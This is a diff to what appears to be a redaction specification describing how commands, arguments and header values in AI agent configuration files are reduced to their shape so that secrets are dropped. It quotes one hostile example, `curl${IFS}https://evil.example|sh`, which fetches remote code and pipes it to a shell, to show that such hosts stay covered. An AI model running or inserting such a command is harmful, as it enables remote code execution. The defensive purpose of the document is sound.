@@ -343,9 +343,20 @@ is run. For the same reason a command, its arguments and the value of an HTTP he
 keep only their shape: the value of every key named `command`, ending in `Command`
 (such as Gemini CLI's `toolDiscoveryCommand`), `args` or `notify`, such as a hook
 command, a `statusLine` command or an MCP server's arguments, keeps the URL origins it
-names and the first word of each command a shell operator starts, without a leading
-`NAME=value` assignment, and no other word, so `check.sh --password 482913` is digested
-as `check.sh`; an argument list keeps only URL origins, and each value under
+names, the unquoted shell operators and the program word of each command, and no other
+word, so `check.sh --password 482913` is digested as `check.sh`. A program word is the
+first word of the value or the first after an unquoted `;`, `&`, `|`, line break, `(`,
+`$(` or opening backtick, after any `NAME=value` assignments and file descriptor
+numbers, and is kept only when it expands nothing but a variable name, as in
+`"$CLAUDE_PROJECT_DIR"/hooks/check.sh`. A wrapper such as `sudo`, `env` or `xargs` is
+the program word, and the words it runs are not kept. No word starts a command inside
+quotes, a comment, a redirection target, arithmetic, an array assignment or a
+`[[ ... ]]` test, or after a backslash before a line break, so
+`mysql -uroot \` followed by `-p482913 app_db` on the next line is digested as `mysql`.
+After `case`, whose patterns follow command separators, no word is kept, and a here
+document or here-string operator (`<<`, `<<-` or `<<<`) and everything after it become
+the operator and `***`, so `sudo -S apt-get update <<EOF`, a line `482913` and `EOF`
+are digested as `sudo<<***`. An argument list keeps only URL origins, and each value under
 `headers`, `httpHeaders`, `http_headers` or `env_http_headers`, such as `X-Pin: 482913`,
 in a map or in a list, becomes `***` while its header name stays. A `headersHelper`
 counts as a command. A permission rule in a Claude Code or Cursor `permissions.allow`,
@@ -362,7 +373,8 @@ the shell operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` an
 which are kept, so a URL or an assigned value ends at the first of them: a command,
 an operator or a host written after one without white space, such as
 `https://cdn.example/a.sh;curl${IFS}https://evil.example|sh` or `pwd=$(id)`, stays
-covered. Each URL scheme in such a text also starts a new part, so every URL keeps
+covered. In a command, an operator inside quotes, and `$`, `{` and `}` other than in
+`$(`, do not split the text, and a URL there keeps only its origin. Each URL scheme in such a text also starts a new part, so every URL keeps
 its own host whatever separates it from the text before it, such as the second host
 in `--webhooks=https://hooks.example/n,https://evil.example/x` or the host assigned to
 a credential-named option such as `--token-url=https://auth.example/t`;
